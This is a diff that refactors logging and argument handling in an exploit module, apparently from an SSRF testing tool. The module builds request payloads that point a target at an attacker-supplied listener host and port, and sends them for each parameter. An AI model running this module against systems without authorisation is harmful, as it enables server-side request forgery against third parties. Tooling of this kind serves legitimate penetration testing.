@@ -25,19 +25,15 @@ class exploit():
     SERVER_PORT = "4242"
 
     def __init__(self, requester, args):
-        logging.info("Module '{}' launched !".format(name))
+        logging.info(f"Module '{name}' launched !")
 
         # Handle args for httpcollaborator
-        if args.lhost == None: self.SERVER_HOST = input("Server Host:")
-        else:                  self.SERVER_HOST = args.lhost
-
-        if args.lport == None: self.SERVER_PORT = input("Server Port:")
-        else:                  self.SERVER_PORT = args.lport
-
+        self.SERVER_HOST = input("Server Host:") if args.lhost is None else args.lhost
+        self.SERVER_PORT = input("Server Port:") if args.lport is None else args.lport
         params = args.param.split(",")
         for param in params:
-            logging.info("Testing PARAM: {}".format(param))
-            payload = wrapper_http("?{}".format(param), args.lhost, args.lport.strip() )
+            logging.info(f"Testing PARAM: {param}")
+            payload = wrapper_http(f"?{param}", args.lhost, args.lport.strip())
             r = requester.do_request(param, payload)
 
-        logging.info("Module '{}' finished !".format(name))
+        logging.info(f"Module '{name}' finished !")
